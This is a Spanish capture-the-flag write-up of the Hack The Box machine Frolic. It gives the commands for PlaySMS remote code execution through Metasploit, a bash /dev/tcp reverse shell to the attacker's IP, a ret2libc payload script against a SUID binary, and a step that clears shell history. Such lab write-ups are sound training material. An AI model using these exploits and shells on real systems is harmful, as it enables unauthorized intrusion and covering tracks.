---
title: "HTB — Frolic (Write‑up)"
tags: [htb, linux, frolic, web, playsms, cve, privesc, ret2libc, suid, writeup]
date: 2025-09-06
author: Iván + ChatGPT
---

# Frolic — Hack The Box (Linux)

> **Dificultad:** Easy  
> **Vector:** Web (PlaySMS) → RCE → SUID `rop` → ret2libc → root  
> **Mi entorno:** Kali, VPN HTB activa  
> **RHOST (box):** `10.129.133.76`  
> **LHOST (mi IP VPN):** `10.10.14.156`  
> **Carpeta de trabajo local:** `~/Desktop/Maquinas/Frolic`

---

## Resumen del camino

1. **Recon:** `nmap` revela puertos `22, 139, 445, 1880 (Node-RED), 9999 (nginx)`.
2. **Web :9999:** existe `/playsms/` (302 a login).  
3. **Explotación PlaySMS:** módulo `exploit/multi/http/playsms_uploadcsv_exec` con `admin:idkwhatispass` → **meterpreter**.
4. **Reverse shell** adicional (nc) desde meterpreter para comodidad.
5. **PrivEsc:** SUID `/home/ayush/.binary/rop` vulnerable a **buffer overflow** (ret2libc, offset 52) → **root**.
6. **Flags:** user y root capturadas.

---

## 0) Variables y carpeta de trabajo

```bash
cd "$HOME/Desktop/Maquinas/Frolic" || exit
export WORK="$HOME/Desktop/Maquinas/Frolic"
export RHOST=10.129.133.76
export LHOST=10.10.14.156
mkdir -p "$WORK/scan" "$WORK/loot"
```

> **Tip:** ajusta `RHOST`/`LHOST` a tu instancia y tun0.

---

## 1) Recon

```bash
nmap -p- --min-rate 5000 -sS -n -Pn "$RHOST" -oN "$WORK/scan/all_ports"
nmap -sCV -p22,139,445,1880,9999 "$RHOST" -oN "$WORK/scan/services"
```

**Salvable esperado (Frolic clásico):**

- `22/tcp` OpenSSH 7.2p2 (Ubuntu)
- `139, 445/tcp` Samba 4.3.11-Ubuntu (sin shares útiles)
- `1880/tcp` Node-RED (HTTP 200)
- `9999/tcp` nginx 1.10.3 (HTTP 200)

---

## 2) Web :9999 — comprobaciones rápidas

```bash
# comprobar rutas clave
for p in "" admin admin/success.html backup dev test playsms robots.txt; do
  u="http://$RHOST:9999/${p}"; [ -z "$p" ] && u="http://$RHOST:9999/"
  printf "%-35s -> %s\n" "$u" "$(curl -s -o /dev/null -w "%{http_code}" "$u")"
done | tee "$WORK/scan/http_quickcheck_9999.txt"

# seguir redirect de /playsms/
curl -s -D - -o /dev/null "http://$RHOST:9999/playsms/"
```

> En esta corrida: `/playsms/` responde **302** a `index.php?app=main&inc=core_auth&route=login` → **PlaySMS activo**.

**Nota (camino alternativo):** Algunos resets muestran puzzles en `/admin/success.html` con **Ook!/Brainfuck** que revelan un **SECRET** (p. ej., `/asdiSIAJJ0QWE9JAS`), el cual devuelve un **ZIP** en Base64 con la **password** de PlaySMS. En esta sesión **no fue necesario** porque las credenciales por defecto funcionaron.

---

## 3) Explotación — PlaySMS (RCE)

**Módulo Metasploit:** `exploit/multi/http/playsms_uploadcsv_exec`

```bash
msfconsole -q -x "
use exploit/multi/http/playsms_uploadcsv_exec;
set RHOSTS $RHOST;
set RPORT 9999;
set TARGETURI /playsms/;
set USERNAME admin;
set PASSWORD idkwhatispass;
set SSL false;
set VERBOSE true;
run"
```

**Salida relevante (éxito):**
```
[+] Authentication successful: admin:idkwhatispass
[*] Sending stage ...
[*] Meterpreter session 1 opened (10.10.14.156:4444 -> 10.129.133.76:50936)
```

> **Nota payload:** el módulo puede usar `php/meterpreter/reverse_tcp` por defecto; también funciona con `cmd/unix/*`. Lo importante es setear **RPORT=9999** y **TARGETURI=/playsms/**.

---

## 4) Reverse shell (nc) desde meterpreter (opcional pero cómodo)

En **equipo local**:
```bash
rlwrap nc -lvnp 5555
```

En **meterpreter** → `shell` y lanzar:
```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.156/5555 0>&1'
```

TTY mejorada:
```bash
python -c 'import pty; pty.spawn("/bin/bash")' 2>/dev/null || python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

**User flag:**
```bash
ls -la /home/ayush
cat /home/ayush/user.txt
# 2b84d1259170d86d1ca2546408fcda8f
```

---

## 5) Escalada de privilegios — SUID `rop` (ret2libc)

### 5.1 Localizar y revisar el binario

```bash
find / -perm -4000 -type f 2>/dev/null | grep -E "rop$"
# /home/ayush/.binary/rop

ls -l /home/ayush/.binary/rop
# -rwsr-xr-x 1 root root 7480 ... /home/ayush/.binary/rop

file /home/ayush/.binary/rop
# setuid ELF 32-bit LSB executable, dynamically linked, not stripped
```

### 5.2 Construir el payload (offset 52)

**Valores que funcionaron en Frolic (libc 32-bit):**

- `offset = 52`
- `system = 0xb7e53da0`
- `exit   = 0xb7e479d0`
- `"/bin/sh" = 0xb7f74a0b`

> Si no funcionan tras un reset, calcula tus direcciones:
> ```bash
> strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
> objdump -T /lib/i386-linux-gnu/libc.so.6 | egrep " system$| exit$"
> ```

**Script payload:**
```python
# /tmp/ret2libc.py
import struct
offset = 52
system = 0xb7e53da0
exit_  = 0xb7e479d0
binsh  = 0xb7f74a0b
payload = b"A"*offset + struct.pack("<I",system) + struct.pack("<I",exit_) + struct.pack("<I",binsh)
open("/tmp/payload","wb").write(payload)
print("Payload listo")
```

**Ejecución:**
```bash
python /tmp/ret2libc.py 2>/dev/null || python3 /tmp/ret2libc.py
/home/ayush/.binary/rop "$(cat /tmp/payload)"
id; whoami
```

**Root flag:**
```bash
cat /root/root.txt
# 8e480fb48a91dc8fec38de434556cbb6
```

---

## 6) Limpieza (opcional)

```bash
rm -f /tmp/payload /tmp/ret2libc.py
history -c 2>/dev/null || true
```

---

## Troubleshooting rápido

- **Metasploit “NoMethodError body nil”** → faltaba `RPORT=9999` o `TARGETURI=/playsms/`.
- **Login PlaySMS falla** → resolvé puzzle de `/admin/` (Ook! → Brainfuck → SECRET → ZIP → pass) o enumerá `/admin/` con `gobuster`.
- **ret2libc no funciona** → recalcula direcciones de `libc` con `strings/objdump`, verifica endianidad (`<I`) y **offset=52**. Mantén comillas en `$(cat /tmp/payload)` (payload binario).

---

## Appendix — Comandos “todo en uno”

**Metasploit (PlaySMS):**
```bash
msfconsole -q -x "
use exploit/multi/http/playsms_uploadcsv_exec;
set RHOSTS $RHOST; set RPORT 9999; set TARGETURI /playsms/;
set USERNAME admin; set PASSWORD idkwhatispass;
set LHOST $LHOST; set LPORT 4444; set SSL false; run"
```

**Reverse shell (listener + one‑liner bash):**
```bash
rlwrap nc -lvnp 5555
# en la box
bash -c 'bash -i >& /dev/tcp/10.10.14.156/5555 0>&1'
```

**ret2libc (payload y ejecución):**
```bash
python /tmp/ret2libc.py 2>/dev/null || python3 /tmp/ret2libc.py
/home/ayush/.binary/rop "$(cat /tmp/payload)"
```

---

## Créditos / Notas

- Box: **Frolic** (HTB) — Linux (2018).  
- PlaySMS exploit: `playsms_uploadcsv_exec` (auth RCE).  
- Privesc: clásico **ret2libc** en binario SUID 32-bit.

> Uso educativo/CTF. No aplicar en sistemas sin autorización.
